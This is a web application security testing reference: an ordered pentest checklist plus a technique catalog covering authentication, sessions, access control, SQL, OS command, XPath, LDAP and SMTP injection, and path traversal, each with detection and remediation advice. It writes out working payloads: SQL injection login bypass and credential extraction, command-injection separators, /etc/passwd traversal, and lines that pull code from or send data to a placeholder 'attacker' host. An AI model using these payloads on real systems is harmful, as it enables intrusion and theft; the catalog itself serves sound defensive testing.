# Web Application Security — Techniques Knowledge Base

A **zero-hallucination catalog** of web application security techniques. Every entry maps to a concrete
flaw class with detection and remediation guidance. Payloads/vectors are field-tested. Framing is
**non-destructive verification** — confirm the flaw, do not weaponize against production without owner
consent (probing can cause data loss / DoS).

Some entries note a current equivalent where an older technique has a modern counterpart. Several
techniques predate modern defenses: CSP, SameSite cookies, prepared-statement ubiquity, JSON parsers
rejecting non-JSON, browsers blocking TRACE/XST and cross-domain frame writes. Treat those as historical
unless the target is legacy.

Core principles: **all client input is untrusted**; the security perimeter lives in the app. Defenses are:
authentication, session management, access control (handle user access); input handling (boundary validation, not a
single frontier); handling attackers (errors, audit logs, alerting, reactive termination); managing the app.
Boundary validation = validate at *each* trust boundary between components, not just the external edge.

---

## THE METHODOLOGY — ordered end-to-end checklist

General rules: URL-encode HTTP-special chars in injected data (`&`=%26, `=`=%3d, `?`=%3f, space=%20/+, `+`=%2b,
`;`=%3b, `#`=%23, `%`=%25, null=%00, newline=%0a). Re-test with benign input to kill false positives (a signature
seen for benign input too = false positive). Reset accumulated state with a fresh browser session. Repeat identical
requests to isolate load-balanced/back-end differences. Use an intercepting proxy (Burp/ZAP/WebScarab) throughout.

1. **Map the application's content**
   1.1 Explore visible content — browse everything through a proxy (passive spider), JS on/off, cookies on/off, auth'd.
   1.2 Consult public resources — search engines (`site:`, `link:`, `related:`), Wayback Machine, cached pages, forums, dev names/emails.
   1.3 Discover hidden content — confirm 404 behavior, brute-force dirs/files/extensions (`txt bak src inc old ~`), infer from naming schemes, review client JS/HTML comments, robots.txt.
   1.4 Discover default content — Nikto (`-root`, `-404`, `-Cgidirs`).
   1.5 Enumerate identifier-specified functions (`?action=editUser`, `servlet=X&method=Y`) — map by functional path, not URL.
   1.6 Test for debug parameters (`debug/test/hide/source=true/yes/on/1`) via cluster-bomb on key pages (login/search/upload).
2. **Analyze the application** — identify functionality, data entry points (URL/query/POST/cookies/headers/out-of-band), technologies (Server banner, Httprint, extensions, session-token names, dir names), map attack surface (associate each function with likely vuln classes).
3. **Test client-side controls** — data transmitted via client (hidden fields, cookies, preset params, opaque/ViewState); client input controls (length limits, JS validation, disabled elements); thick clients (applets, ActiveX, Flash).
4. **Test authentication** — understand mechanism; password quality; username enumeration; password-guessing resilience/lockout; account recovery; remember-me; impersonation; username uniqueness; credential predictability; unsafe transmission; unsafe distribution; logic flaws (fail-open, multistage); exploit to gain access (breadth-first guessing, respect lockout).
5. **Test session management** — understand mechanism (which item is the token); tokens for meaning; tokens for predictability; insecure transmission; disclosure in logs; token→session mapping (concurrent logins, sub-token tampering); session termination (timeout/logout server-side); session fixation; XSRF; cookie scope.
6. **Test access controls** — understand vertical/horizontal requirements; test with multiple accounts (high→low, user A vs B); test with limited access (guess identifiers); test insecure methods (`admin=true`, Referer-based).
7. **Test input-based vulnerabilities** — fuzz ALL params (query/body/cookies/Referer/User-Agent), one at a time, with the payload set below; then per-category: SQLi, XSS/response injection (reflected XSS, header injection, redirection, stored), OS command injection, path traversal, script injection, file inclusion.
8. **Test function-specific input** — SMTP injection, native code (buffer overflow / integer / format string), SOAP injection, LDAP injection, XPath injection.
9. **Test logic flaws** — identify key attack surface (multistage, security functions, trust transitions, price/qty adjustments); test multistage processes; incomplete input (drop params); trust boundaries; transaction logic (negatives, accrual, discount ordering).
10. **Test shared hosting** — segregation in shared infra (remote access, file/shell access); segregation between ASP-hosted apps (shared logging/admin/DB components).
11. **Test web server** — default credentials; default content; dangerous HTTP methods (OPTIONS→PUT/WebDAV); proxy functionality (GET full-URL / CONNECT); virtual hosting misconfig (Host header variants); server software bugs (Nessus, Bugtraq).
12. **Miscellaneous** — DOM-based XSS/redirect (review JS); frame injection; local privacy (persistent cookies, caching, autocomplete); follow up information leakage; weak SSL ciphers (THCSSLCheck).

### Universal fuzz payload set (step 7.1.3)
```
SQLi:            '   '--   '; waitfor delay '0:30:0'--   1; waitfor delay '0:30:0'--
XSS/hdr:         xsstest   "><script>alert('xss')</script>
OS cmd:          || ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
                 | ping -i 30 127.0.0.1 |   | ping -n 30 127.0.0.1 |
                 & ping -i 30 127.0.0.1 &   & ping -n 30 127.0.0.1 &
                 ; ping 127.0.0.1 ;   %0a ping -i 30 127.0.0.1 %0a   ` ping 127.0.0.1 `
Path traversal:  ../../../../../../../../../../etc/passwd   ../../..(x10)../boot.ini   (also backslash variants)
Script inject:   ;echo 111111   echo 111111   response.write 111111   :response.write 111111
File inclusion:  http://<your-server>/   http://<nonexistent-ip>/
```
Grep responses for: `error exception illegal invalid fail stack access directory file not found varchar ODBC SQL SELECT 111111`
plus payload-reflection grep (XSS/header injection) and status/length/time anomalies.

---

## TECHNIQUE CATALOG

### === CLIENT-SIDE CONTROLS ===

#### transmit-data-via-client
- **name**: Trusting data transmitted via the client
- **what**: App sends server-controlled data to the client (hidden fields, cookies, preset URL params, Referer, opaque blobs) expecting it back unmodified, then trusts it.
- **where-it-lives**: `<input type=hidden>` (esp. `price`, `discount`, `uid`, `role`); `Set-Cookie: DiscountAgreed=25`; preset URL params in image/frame/POST-target URLs; `Referer`-based flow gating (e.g. password-reset step check).
- **how-to-detect**: Intercepting proxy — locate every hidden field/cookie/preset param; infer purpose from name/context.
- **how-to-exploit / test**: Modify value in the proxy on the fly and observe server processing. Try negative prices; replay an encrypted/opaque value from a cheaper product; spoof `Referer` to the required step.
- **remediation**: Hold sensitive data server-side (look up price/discount per-session). If unavoidable, sign AND/OR encrypt with context to prevent replay; never trust headers as tamper-proof.
- **tools**: Burp Proxy, WebScarab, Paros, TamperData, TamperIE.

#### client-side-input-validation
- **name**: Client-side input validation not replicated server-side
- **what**: `maxlength`, JS `onsubmit` validators, and disabled elements enforce constraints only in the browser.
- **where-it-lives**: `maxlength=` attrs, `<script>` validators / `onsubmit="return Validate(this)"`, `disabled=true` fields.
- **how-to-detect**: Read HTML source / server responses (disabled elements aren't submitted by browser — find them in responses, not traffic).
- **how-to-exploit / test**: Submit overlong / malformed data via proxy (or disable JS, or edit the validator to `return true`); test each field individually leaving others valid (server may stop at first error). Submit disabled-element names to see if processed. Then chain into SQLi/XSS/overflow.
- **remediation**: Re-validate all input server-side. Client validation is fine for UX only.
- **tools**: Burp Proxy (find-and-replace to strip `disabled`/`maxlength`, strip `If-Modified-Since`/`If-None-Match` to defeat 304 caching when intercepting responses).

#### aspnet-viewstate
- **name**: ASP.NET ViewState tampering / disclosure
- **what**: Base64 serialized page state in `__VIEWSTATE`; may store app data (e.g. price) and may be unprotected.
- **where-it-lives**: `__VIEWSTATE` hidden field. Keyed-hash (MAC) present = last ~20 bytes are a hash.
- **how-to-detect**: Decode with Burp ViewState analyzer; check whether `EnableViewStateMac` is set (per-page).
- **how-to-exploit / test**: If no MAC, edit a value (mind length-prepended strings in v2 format), re-encode, resubmit. Even with MAC, review for sensitive data leaked in the ViewState.
- **remediation**: Enable ViewState MAC on every page; never store sensitive/custom data in ViewState.
- **tools**: Burp Proxy ViewState decoder.

#### thick-client-controls
- **name**: Bypassing thick-client (applet / ActiveX / Flash) controls
- **what**: Java applets, ActiveX controls, Flash (SWF) perform validation/obfuscation client-side; all is reverse-engineerable.
- **where-it-lives**: `<applet code=...>`, `.jar`; `<object classid=...>`, `.cab`; SWF/`.swf`.
- **how-to-detect**: Proxy for `.class/.jar/.cab/.swf` requests; applet/object tags in source. If submitted data is transparent → attack like any param.
- **how-to-exploit / test**: If opaque: decompile applet bytecode (Jad/Jode), find public obfuscation methods or recompile with `javac`; ActiveX — debug with OllyDbg / enumerate methods with COMRaider / feed inputs via HTML / monitor with Filemon/Regmon and forge required registry/files; Flash — Flasm (disassemble/reassemble bytecode), Flare (decompile ActionScript).
- **remediation**: Never trust client-side validation; obfuscation only delays. Validate/obfuscate server-side.
- **tools**: Jad, Jode, JSwat, .NET Reflector, OllyDbg, COMRaider, Filemon/Regmon, Flasm, Flare, Microsoft Detours.

### === AUTHENTICATION ===

#### weak-passwords
- **name**: Bad password quality
- **what**: App allows short/blank, dictionary, username-equals-password, default passwords.
- **where-it-lives**: Registration / password-change quality rules (or absence thereof).
- **how-to-detect**: Read stated rules; try setting weak passwords via self-register / change-password.
- **how-to-exploit / test**: Feed weak-password knowledge into guessing attacks (removes superfluous test cases).
- **remediation**: Enforce length + character-class + no-dictionary + no-username rules server-side; allow long passwords and wide charset.
- **tools**: —

#### brute-force-login
- **name**: Brute-forcible login
- **what**: Unlimited login attempts → automated password guessing.
- **where-it-lives**: Main login, password-change, forgotten-password, self-register.
- **how-to-detect**: ~10 bad logins then a good one; if success, likely no lockout. Client-side counters (`failedlogins=1` cookie) are trivially bypassed.
- **how-to-exploit / test**: Identify a discriminator between success/failure (status code, response length, "login incorrect" text). Iterate username×password lists. **Breadth-first** (one common password across all usernames) to dodge lockout and find weak accounts fast. Common values: admin, administrator, password, password1, letmein, test, [orgname].
- **remediation**: Temporary account suspension (e.g. 3 fails → 30 min); reject during suspension without checking creds; don't disclose lockout metrics; CAPTCHA (check ALT text/hidden fields for the answer); unpredictable usernames.
- **tools**: Burp Intruder (battering-ram to set password=username), Hydra.

#### username-enumeration
- **name**: Username enumeration
- **what**: App reveals which usernames are valid (verbose messages, subtle response diffs, timing, self-register duplicate-rejection).
- **where-it-lives**: Login, registration, password change, forgotten-password. Also: user1842-style predictable names, email-as-username, source comments, logs.
- **how-to-detect**: Submit valid vs random username; compare status code, redirects, on-screen text, HTML source (comments/typographical diffs), and **response timing** (valid username triggers heavier back-end processing).
- **how-to-exploit / test**: Automate over common-username list; filter "valid" responses. Timing-based even when responses identical.
- **remediation**: Single generic failure message from one code component; system-generated usernames; email-based registration flow that reveals nothing.
- **tools**: Burp Intruder (Grep, response timing columns), WebScarab compare.

#### credential-transmission
- **name**: Unsafe transmission of credentials
- **what**: Creds sent over HTTP, in URL query string, in cookies, or reflected back to client; or login page loaded over HTTP then submitted over HTTPS.
- **where-it-lives**: Login, registration, change/view profile. Watch 302 redirects that move creds to query string.
- **how-to-detect**: Monitor both directions; flag messages containing the credential strings (proxy interception rules).
- **how-to-exploit / test**: Query-string creds → browser history / server logs / Referer. Cookie creds → XSS/local capture, replay even if encrypted. HTTP login page → MITM rewrites form action to HTTP.
- **remediation**: HTTPS everywhere including the login *page*; POST only; never in URL/cookie; never reflect back.
- **tools**: Burp Proxy, Wireshark.

#### password-change-abuse
- **name**: Password-change function flaws
- **what**: Change-password reintroduces login flaws — username enumeration, unlimited old-password guessing, checking new==confirm only after validating old.
- **where-it-lives**: Change-password endpoint (may be hidden). May accept an injected `username` param overriding the current user.
- **how-to-detect**: Submit invalid usernames / wrong old passwords / mismatched new+confirm; watch for enumeration or unrestricted guessing.
- **how-to-exploit / test**: If no username field, inject one (same name as login form) to target other users.
- **remediation**: Authenticated session only; no username param; require existing password; compare new==confirm first; generic errors; suspend after few fails; out-of-band notify.
- **tools**: Burp Intruder.

#### forgotten-password
- **name**: Forgotten-password / account-recovery flaws
- **what**: Weak secondary challenges (mother's maiden name, self-chosen questions), password hints, guessable recovery, insecure recovery delivery.
- **where-it-lives**: "Forgot password" link; challenge questions; password hints; recovery-URL/email logic; user-supplied email-for-recovery field (even hidden).
- **how-to-detect**: Walk through with your own account; harvest challenges/hints across enumerated usernames; test brute-forcibility of answers.
- **how-to-exploit / test**: Guess easy challenges; if recovery email address is user-controllable (incl. hidden field), redirect it to yourself; predict recovery-URL patterns by registering several accounts; try reusing an activation URL (lock account first).
- **remediation**: Common mandated challenge with high entropy; suspend after fails; leak nothing; email a unique, time-limited, single-use recovery URL to the *registered* address; never disclose the old password or drop into a session.
- **tools**: Burp Intruder; token-predictability analysis (see predictable-tokens methods).

#### remember-me
- **name**: Insecure "remember me"
- **what**: Persistent cookie that authenticates without password — `RememberUser=peterwiener` or a predictable persistent id.
- **where-it-lives**: Persistent cookies set by remember-me.
- **how-to-detect**: Activate it; inspect persistent cookies for username/predictable id; compare cookies for similar usernames to reverse obfuscation.
- **how-to-exploit / test**: Change cookie to another username / predicted id; or capture via XSS.
- **remediation**: Remember only non-secret items (username), never a bypass token; if opting in to remember password, store reversibly-encrypted (key server-side only); kill XSS.
- **tools**: Burp Proxy.

#### user-impersonation
- **name**: User-impersonation function flaws
- **what**: Admin/helpdesk impersonation feature abusable — hidden/unprotected function, trusts user-controlled account identifier, or a backdoor password.
- **where-it-lives**: `/admin/ImpersonateUser.jsp`; a cookie/param specifying the impersonated account; a magic password accepted for any user.
- **how-to-detect**: Find the function (may be unlinked); manipulate any account identifier; during brute force watch for accounts with 2 valid passwords or one password matching many accounts (= backdoor).
- **how-to-exploit / test**: Impersonate admin to escalate vertically.
- **remediation**: Strong access control; drive from session; restrict to internal/audited use; no backdoor passwords.
- **tools**: Burp Intruder.

#### incomplete-credential-validation
- **name**: Incomplete validation of credentials
- **what**: App truncates password, is case-insensitive, or strips characters — shrinking the keyspace.
- **where-it-lives**: Login password check.
- **how-to-detect**: With a known account, log in with variants: drop last char, change case, remove special chars. Any success reveals validation weakness.
- **how-to-exploit / test**: Prune guessing keyspace accordingly.
- **remediation**: Validate full password, case-sensitive, no filtering/truncation.
- **tools**: —

#### non-unique-predictable-usernames-passwords
- **name**: Non-unique usernames / predictable usernames / predictable initial passwords
- **what**: Duplicate usernames allowed (collision leaks creds / enables blind brute force); sequential usernames (`cust5331`); batch-generated predictable initial passwords.
- **where-it-lives**: Self-registration; auto-generated credentials.
- **how-to-detect**: Register same username twice (different, then same password); generate several usernames/passwords rapidly and look for sequence.
- **how-to-exploit / test**: Register a target username repeatedly with different passwords; a rejection = you found their existing password (no login attempt needed). Extrapolate username/password sequences.
- **remediation**: Enforce unique usernames; system-generate with entropy; no correlation to username.
- **tools**: Burp Intruder.

#### fail-open-login
- **name**: Fail-open login logic
- **what**: An exception in credential checking (e.g. missing param → NPE) results in a *successful* login.
- **where-it-lives**: Login handlers with try/catch that swallow exceptions before the "invalid" return; complex multi-method login logic.
- **how-to-detect**: Do a valid login, record everything; replay repeatedly mutating each param: empty string, remove name/value pair entirely, very long/short, string↔number swaps, duplicate params. Watch for divergence from base case; combine mutations.
- **how-to-exploit / test**: Submit malformed requests that trigger the fail-open path.
- **remediation**: Catch-all handlers that explicitly invalidate the session/force logout on error; code-review login logic.
- **tools**: Burp Intruder/Repeater.

#### multistage-login-defects
- **name**: Defects in multistage login mechanisms
- **what**: Multi-step login (username→PIN→token) makes unsafe assumptions: stage 3 reachable without 1–2; trusts data validated earlier but mutable later; doesn't check same identity across stages; attacker-chosen "random" question.
- **where-it-lives**: Banking-style logins; hidden fields carrying username/flags between stages; randomly-varying secret questions.
- **how-to-detect**: Map each stage and data collected; note any data submitted more than once or round-tripped via client.
- **how-to-exploit / test**: Reorder stages; jump straight to a stage; skip stages; submit different users' data at different stages; modify state flags (`stage2complete=true`); if the varying question is sent with its answer, change the question; or re-initiate login until the question you know is presented.
- **remediation**: Hold all progress state server-side; verify prior stages first; proceed through all stages then give one generic failure; store the presented question server-side per user.
- **tools**: Burp Repeater/Intruder.

#### insecure-credential-storage
- **name**: Insecure storage of credentials
- **what**: Passwords stored unencrypted/recoverable in the DB.
- **where-it-lives**: DB user table; any function that echoes a password back to the client.
- **how-to-detect**: If a password is ever sent back to the client, storage is likely insecure; leverage SQLi/command/access-control flaws to read the store.
- **remediation**: Strong salted hash; use bcrypt/scrypt/Argon2 with per-user salt.

### === SESSION MANAGEMENT ===

First: confirm which item is actually the token (may be several items; the web-server default cookie may be unused). Remove each suspected item from a session-dependent request (Burp Repeater) to prove it. Change token byte-by-byte to find which sub-parts are actually validated.

#### meaningful-tokens
- **name**: Meaningful / structured session tokens
- **what**: Token encodes username/id/role/timestamp/IP, often base64/hex/XOR — guess other users' tokens.
- **where-it-lives**: Cookies / hidden fields that decode to structured data (e.g. `757365723d...` → `user=daf;app=admin;date=...`).
- **how-to-detect**: Log in as similar usernames (A, AA, AAA, AAAB...); look for length correlation (obfuscation), repeating chars (XOR), hex-only runs (hex ASCII), `=`/base64 charset.
- **how-to-exploit / test**: Reconstruct tokens for enumerated usernames; test against a session-dependent page.
- **remediation**: Opaque tokens with no derivable meaning.
- **tools**: Burp Intruder, WebScarab.

#### predictable-tokens
- **name**: Predictable session tokens
- **what**: Sequential, concealed-sequence (revealed after decode + differencing), time-dependent, or weak-PRNG tokens (e.g. `java.util.Random` LCG — one token predicts all).
- **where-it-lives**: Token generation. Sequences appear after base64/hex decode; time components track `currentTimeMillis()`.
- **how-to-detect**: Harvest hundreds of tokens fast; decode; difference successive values; sample again minutes later to spot time dependency; re-sample from different IP/username to confirm extrapolation works cross-user; NIST FIPS-140-2 randomness tests for critical apps.
- **how-to-exploit / test**: Extrapolate to other users' live tokens; brute-force narrow ranges between known bounds (e.g. sequential-id + millisecond-time pair).
- **remediation**: CSPRNG; add per-request entropy (source IP:port, User-Agent, ms time) + server secret, then SHA-256.
- **tools**: Burp Intruder, WebScarab cookie analyzer, Stompy.

#### token-disclosure-network
- **name**: Token disclosure on the network
- **what**: Token sent over HTTP even when HTTPS is used elsewhere (HTTP static content, pre-auth pages keeping the same token, HTTP downgrade, HTTP service on :80).
- **where-it-lives**: Missing cookie `secure` flag; token issued pre-login and upgraded; HTTP links in HTTPS area.
- **how-to-detect**: Walk the whole app logging every new token and HTTP↔HTTPS transition; check `secure` flag; visit any HTTP URL from an authenticated session.
- **how-to-exploit / test**: Eavesdrop/replay the token to hijack the session.
- **remediation**: HTTPS everywhere; `secure` cookies; issue fresh token at login; kill any :80 service.
- **tools**: Wireshark, Burp Proxy.

#### token-disclosure-logs / token-session-mapping / session-termination
- **name**: Token disclosure in logs; weak token→session mapping; vulnerable session termination
- **what**: Tokens shown in admin/diagnostic/monitoring functions or URLs (→ Referer/logs); tokens map loosely (concurrent logins allowed; same persistent string re-issued per login); no server-side timeout; logout doesn't invalidate server-side.
- **where-it-lives**: Logging/monitoring UI; tokens in URLs; login/logout handling.
- **how-to-detect**: Review logging functions for tokens and their access control; log in twice (concurrent?); log in/out repeatedly (new token each time?); after wait/logout, replay old token against a protected page (Burp Repeater/Intruder time-increment).
- **how-to-exploit / test**: Harvest/replay tokens; probe which belong to admins.
- **remediation**: Never display tokens; single-use invalidation on logout; server-side idle timeout; prevent concurrent logins; reissue token at login.
- **tools**: Burp Repeater/Intruder.

#### liberal-cookie-scope
- **name**: Liberal cookie scope
- **what**: Cookie `domain`/`path` too broad → other apps on parent domain/subdomains/path-prefix can capture it.
- **where-it-lives**: `Set-Cookie` `domain=`/`path=` attributes (path without trailing slash: `/bank` exposes `/banktest`).
- **how-to-detect**: Review Set-Cookie scope; enumerate domains/paths that receive the cookie; find other apps there.
- **remediation**: Narrowest possible scope; don't host untrusted apps on subdomains/paths of a sensitive app.

### === ACCESS CONTROL ===

#### broken-access-control
- **name**: Broken access control (vertical & horizontal privilege escalation)
- **what**: App lets a user do/see what they shouldn't. Variants: completely unprotected functionality (protected only by unlinked/obscure URLs); identifier-based (`?docid=1280149120` with no ownership check); multistage (later stages unprotected); static files (direct URL to `/download/ISBN.pdf`); insecure methods (`admin=true` param, Referer-based).
- **where-it-lives**: `/admin/`, cryptic admin URLs referenced in client JS (`if(isAdmin){addItem("/menus/.../addNewPortalUser2.jsp")}`); resource-id params; multistep POST flows carrying source-account etc. in hidden fields; static protected files; `?admin=true`, Referer checks.
- **how-to-detect**: Map with a high-priv account, re-request each function/URL/resource as a low-priv (or no) account. Two-account horizontal test: access user B's document-id from user A's session. Spider twice with different session tokens and diff. Test each stage of multistage functions individually. Remove/modify Referer on an authorized request — if it now fails, Referer is (unsafely) trusted; then supply the original Referer as an unauthorized user.
- **how-to-exploit / test**: Enumerate/guess identifiers (predictable ids → automated harvest with Burp Intruder Extract Grep); low account-ids are often admins; add `admin=true`.
- **remediation**: Deny-by-default; drive all decisions from the session via a central component queried by every page; assume all URLs/ids are known to attackers; revalidate identifiers server-side; protect static files via a dynamic gateway or server auth; per-transaction reauth for critical actions; multi-layer (app-server URL roles, per-user DB accounts, table privileges, least-priv OS accounts).
- **tools**: Burp Intruder (Extract Grep to harvest), spider with swapped tokens.

### === CODE INJECTION ===

Interpreted-language injection family: attacker input breaks out of data context into the interpreter's grammar. Applies to SQL, LDAP, XPath, SOAP/XML, OS shell, PHP/ASP/Perl eval, SMTP.

#### sql-injection
- **name**: SQL injection
- **what**: User input concatenated into a SQL statement (SELECT/INSERT/UPDATE/DELETE) alters query logic; can read/modify all data and often compromise the DB server/OS.
- **where-it-lives**: Any param used in a query — WHERE clauses, `ORDER BY`, table/column names, login checks, search, INSERT VALUES lists. Clues: `OrderBy=` param, numeric ids, DB error messages.
- **how-to-detect**: Submit `'`; a resulting error/anomaly then disappearing with `''` = likely SQLi. String-concat equivalence: `'||'FOO`, `'+'FOO`, `' 'FOO`. Numeric: replace `2` with `1+1`, `3-1`, `67-ASCII('A')`. Time-delay for blind/completely-blind: `'; waitfor delay '0:30:0'--` (MS-SQL). Fingerprint via concat: Oracle `'a'||'b'`, MS-SQL `'a'+'b'`, MySQL `'a' 'b'`; or numeric no-op errors: Oracle `BITAND(1,1)-BITAND(1,1)`, MS-SQL `@@PACK_RECEIVED-@@PACK_RECEIVED`, MySQL `CONNECTION_ID()-CONNECTION_ID()`.
- **how-to-exploit / test**:
  - Login bypass: `admin'--` or `' or 1=1--` (WARNING: `' or 1=1--` in UPDATE resets *all* rows — get owner consent + backup).
  - UNION: find column count via `' UNION SELECT NULL--` (add NULLs) or `' ORDER BY n--`; find a string column by replacing a NULL with `'a'`; extract: `' UNION SELECT username,password,uid FROM users--`. Oracle needs `FROM DUAL`.
  - Version: `@@version` (MS-SQL/MySQL), `SELECT banner FROM v$version` (Oracle).
  - Metadata: Oracle `user_objects`/`user_tab_columns`/`all_users`; MS-SQL `sysobjects (xtype='U')`/`syscolumns`.
  - ODBC error extraction (MS-SQL): `' having 1=1--` (leaks table.col), `' group by ... having 1=1--`, `' or 1 in (select @@version)--` (cast-to-int error leaks string); recursion with `min(x) where x > 'prev'`.
  - Blind inference: `AND ASCII(SUBSTRING('Admin',1,1))=65--` conditional responses; conditional errors `SELECT 1/0 ... WHERE (condition)`; time delays (MS-SQL `waitfor`, MySQL `benchmark(50000,sha1('x'))`, Oracle `UTL_HTTP.request` timeout). Extract numerically via `ASCII(SUBSTRING(...))`.
  - Out-of-band: MS-SQL `OpenRowSet` insert to attacker DB; Oracle `UTL_HTTP`/`UTL_INADDR`(DNS)/`UTL_SMTP`/`UTL_TCP`; MySQL `SELECT ... INTO OUTFILE '\\\\attacker\\share\\out.txt'`.
  - Escalate to OS: MS-SQL `xp_cmdshell`, `xp_regread/write`, `OpenRowSet` port scan; Oracle default-package flaws (`SYS.DBMS_EXPORT_EXTENSION`, `CTXSYS.DRILOAD.VALIDATE_STMT`), `UTL_FILE`; MySQL `load_file()`, `INTO OUTFILE`, UDFs.
- **filter bypass**: numeric fields need no quote; replace `--` with `' or 'a'='a`; MS-SQL batch without semicolon; case (`SeLeCt`), doubled keyword (`SELSELECTECT`), URL/double-URL encode; inline comments `SEL/*foo*/ECT`; build strings via concat/`CHR()`; `exec()`/hex-string/`EXECUTE IMMEDIATE` dynamic exec; escape doubled-quote truncation & second-order (data stored escaped, read back raw).
- **remediation**: **Parameterized queries** everywhere, every param (not stored procs alone, not quote-doubling). Least-privilege DB accounts; remove/disable dangerous default functionality; patch DB.
- **tools**: sqlmap, Absinthe (inference, binary-chop), Burp Intruder (Recursive Grep for ODBC recursion).

#### os-command-injection
- **name**: OS command injection
- **what**: User input passed to a shell command interpreter (`exec` in PHP, `wscript.shell` in ASP, Perl backticks, Java `Runtime.exec`).
- **where-it-lives**: Admin interfaces to servers/devices (firewalls/printers/routers), logging, email, diagnostics; any param reaching a shell.
- **how-to-detect**: Time-delay all-purpose probe: `|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &` plus the per-separator variants in the fuzz set; confirm delay scales with the ping count.
- **how-to-exploit / test**: Separators `; | & newline` and doubled `&&`/`||`; backticks `` `cmd` ``. Retrieve output: inject `ls`/`dir`; else out-of-band (TFTP tools up, nc/telnet reverse shell, `mail` for output) or redirect to web root `dir > c:\inetpub\wwwroot\foo.txt`. Determine privilege (`whoami`). If separators filtered: use `<`/`>` for file read/write, or inject extra command-line args (e.g. wget `-O`); if spaces filtered on Unix use `$IFS`; if escape char used, prefix with backslash (escape-the-escape).
- **remediation**: Avoid shell calls; use safe APIs (`Runtime.exec` with arg array, `Process.Start`) that don't invoke a shell; whitelist / restrict to alphanumeric.
- **tools**: Burp Intruder, netcat.

#### script-injection-dynamic-exec
- **name**: Dynamic code execution injection (PHP eval / ASP Execute / Perl eval)
- **what**: User input reaches `eval`/`Execute` and runs as server code.
- **where-it-lives**: Stored searches, cookie/profile values fed to `eval()` (PHP/Perl), `Execute()` (ASP).
- **how-to-detect**: Submit `;echo 111111`, `echo 111111`, `response.write 111111`, `:response.write 111111`. If `111111` alone appears in the response, it executed. PHP: try `phpinfo()`.
- **how-to-exploit / test**: PHP `system('cat /etc/passwd')` / `file_get_contents`; ASP `WScript.Shell` `cmd.exe /c dir > ...`; verify with `system('ping 127.0.0.1')` time delay.
- **remediation**: Never pass user input to dynamic-exec/include functions; whitelist.
- **tools**: Burp Intruder.

#### file-inclusion
- **name**: Remote / local file inclusion
- **what**: Include path built from user input. RFI (PHP `include` accepts URLs) → run attacker-hosted code; LFI → include server files/scripts to bypass access controls or dump static files.
- **where-it-lives**: `?Country=US` → `include($country.'.php')`; `template=`, `page=`, `include=` params; ASP `Server.Execute`.
- **how-to-detect**: RFI — submit `http://<your-server>/` and watch for inbound request; or nonexistent IP and watch for timeout. LFI — submit a known executable/static resource name and watch behavior/contents.
- **how-to-exploit / test**: RFI `?Country=http://attacker/backdoor`; LFI include protected functions/static files.
- **remediation**: Don't build includes from input; whitelist languages/locations; disable `allow_url_include`.
- **tools**: netcat/web server listener, Burp Intruder.

#### soap-injection
- **name**: SOAP / XML injection
- **what**: Input with XML metachars (`< > /`) inserted into a SOAP message between back-end tiers alters logic.
- **where-it-lives**: Params relayed into inter-tier SOAP (e.g. banking `ClearedFunds` element).
- **how-to-detect**: Submit `</foo>` (error?), then `<foo></foo>` (error disappears? → vulnerable). Reflection test: `test<foo/>` vs `test<foo></foo>` returned as each other or as `test`. Split comment chars `<!--` / `!-->` across two params (both orders).
- **how-to-exploit / test**: Inject an extra `<ClearedFunds>True</ClearedFunds>`; comment out parts of the message.
- **remediation**: HTML/XML-encode metachars at every boundary (`< &lt; > &gt; / &#47;`).

#### xpath-injection
- **name**: XPath injection
- **what**: Input concatenated into an XPath query over an XML store (often credentials/config) → subvert logic, extract whole document.
- **where-it-lives**: XML-backed login/search/config. Keywords case-sensitive; single quote not needed for numeric.
- **how-to-detect**: `'` / `'--` break syntax; `' or 'a'='a`, `' and 'a'='b`, `or 1=1`, `and 1=2` change behavior. Confirm with `' or count(parent::*[position()=1])=0 or 'a'='b` vs `>0`.
- **how-to-exploit / test**: Auth bypass `' or 'a'='a`; informed extraction `' or //address[.../substring(password/text(),1,1)='M'] and 'a'='a`; blind: `substring(name(parent::*[position()=1]),1,1)='a'` then `//parentnode[position()=1]/child::node()[position()=N]/text()`; use `count()` and `string-length()` to bound iteration.
- **remediation**: Strict whitelist (alphanumeric); block `( ) = ' [ ] : , * /` and whitespace; reject not sanitize.

#### smtp-injection
- **name**: SMTP / email header injection
- **what**: Newlines in email fields inject headers (Cc/Bcc) or raw SMTP commands (spam relay, arbitrary mail).
- **where-it-lives**: Feedback / "contact us" / report forms; From/Subject/Message fields; PHP `mail()` additional_headers.
- **how-to-detect**: Submit each param with both Windows and Unix newlines: `<email>%0aCc:<email>`, `%0d%0aBcc:...`, and full SMTP-command payloads (`%0aDATA%0afoo%0a%2e%0aMAIL+FROM:...`). Monitor your inbox; review the form for a hidden `To` field.
- **remediation**: Regex-validate emails (reject newlines); no newlines in subject; disallow lone `.` lines. Also test these forms for OS command injection.

#### ldap-injection
- **name**: LDAP injection
- **what**: Input into an LDAP search filter/attributes → return unauthorized attributes/records, subvert filter.
- **where-it-lives**: Intranet directory search (Active Directory), HR apps.
- **how-to-detect**: `*` returns many results (LDAP wildcard, not SQL); `))))))))))` may error; `*);cn;`, `*));cn;` (add brackets until error clears).
- **how-to-exploit / test**: Inject attributes `GUILL);mail,cn;`; wildcard filter `*);cn,l,co,st,c,mail,cn;`; subvert combined filter `*));cn,cn;` to drop `(c=FR)`.
- **remediation**: Whitelist alphanumeric; block `( ) ; , * | & =`; reject not sanitize.

### === PATH TRAVERSAL ===

#### path-traversal
- **name**: Path / directory traversal
- **what**: User input reaches a filesystem API → read/write arbitrary files (`../`), leading to data theft or code execution.
- **where-it-lives**: File up/download, `include=`, `template=/en/sidebar`, image/doc display; params holding filenames/paths.
- **how-to-detect**: In-directory probe first: `file=foo/bar/../file1.txt` behaves same as `foo/file1.txt` → candidate. Then traverse out: `../../../../../../../../../../../../etc/passwd` or `..\..\...\windows\repair\sam`. Use many sequences (deep start dir); try both `/` and `\` (Windows tolerates both; back-end may differ). Write-access test: write a normally-writable vs a protected file (`/tmp/writetest.txt` vs `/tmp`).
- **how-to-exploit / test**: Read passwd/config/include/source/logs; write to startup folders / web root scripts / `in.ftpd`. Bypass filters: URL-encode every dot/slash (`%2e %2f %5c`), 16-bit unicode (`%u002e %u2215`), double-encode (`%252e`), overlong UTF-8 (`%c0%af`), nested `....//`; null-byte/newline suffix to defeat extension check (`../../boot.ini%00.jpg`, `...%0a.jpg`); prepend accepted stem (`app-dir/images/../../../etc/passwd`).
